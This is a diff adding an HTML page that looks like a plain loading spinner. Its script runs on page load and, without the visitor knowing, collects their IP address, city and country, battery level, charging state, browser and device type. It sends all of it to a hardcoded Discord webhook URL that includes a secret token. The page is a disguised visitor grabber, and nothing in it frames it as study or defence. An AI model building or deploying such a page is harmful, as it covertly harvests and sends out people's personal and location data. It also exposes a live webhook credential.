@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+        .loading-circle {
+            border: 5px solid #f3f3f3; /* Light grey */
+            border-top: 5px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-circle"></div>
+
+<script>
+    // Function to get user details and send to Discord webhook
+    function notifyDiscord() {
+        // Get battery status
+        navigator.getBattery().then(function(battery) {
+            const batteryLevel = battery.level * 100; // battery percentage
+            const charging = battery.charging ? 'Yes' : 'No';
+
+            // Get browser and device details
+            const userAgent = navigator.userAgent;
+            const browser = getBrowserName(userAgent);
+            const device = getDeviceType(userAgent);
+
+            // Get IP and location details using ipinfo.io API
+            fetch('https://ipinfo.io/json?token=YOUR_IPINFO_API_KEY')  // Replace with your IP info API key
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const city = data.city;
+                    const country = data.country;
+
+                    // Prepare an Embed payload for Discord
+                    const embed = {
+                        title: "User Interaction on Website",
+                        description: `Someone visited the website!`,
+                        color: 3447003, // Blue color
+                        fields: [
+                            {
+                                name: "IP",
+                                value: ip,
+                                inline: true
+                            },
+                            {
+                                name: "Location",
+                                value: `${city}, ${country}`,
+                                inline: true
+                            },
+                            {
+                                name: "Battery Level",
+                                value: `${batteryLevel}%`,
+                                inline: true
+                            },
+                            {
+                                name: "Charging",
+                                value: charging,
+                                inline: true
+                            },
+                            {
+                                name: "Browser",
+                                value: browser,
+                                inline: true
+                            },
+                            {
+                                name: "Device",
+                                value: device,
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Website Interaction Tracker"
+                        },
+                        timestamp: new Date()
+                    };
+
+                    // Send data to Discord webhook with Embed
+                    const webhookURL = 'https://discord.com/api/webhooks/1322920418188722196/x1AB8TW_CLihebtS-KYPKUX7vP6zyONYPI3D4mb-35RMkmhXVChS7_WdYlzXCuOEgiRK';  // Replace with your Discord webhook URL
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            embeds: [embed]  // Send embed as part of the webhook payload
+                        }),
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Message sent:', data))
+                    .catch(error => console.error('Error:', error));
+                })
+                .catch(error => console.error('Error fetching IP data:', error));
+        });
+    }
+
+    // Function to get browser name
+    function getBrowserName(userAgent) {
+        if (userAgent.includes("Chrome")) {
+            return "Chrome";
+        } else if (userAgent.includes("Firefox")) {
+            return "Firefox";
+        } else if (userAgent.includes("Safari")) {
+            return "Safari";
+        } else if (userAgent.includes("Edge")) {
+            return "Edge";
+        } else {
+            return "Unknown Browser";
+        }
+    }
+
+    // Function to get device type (mobile/desktop)
+    function getDeviceType(userAgent) {
+        if (/Mobi|Android/i.test(userAgent)) {
+            return "Mobile";
+        } else {
+            return "Desktop";
+        }
+    }
+
+    // Call the function when the page loads
+    window.onload = notifyDiscord;
+</script>
+
+</body>
+</html>
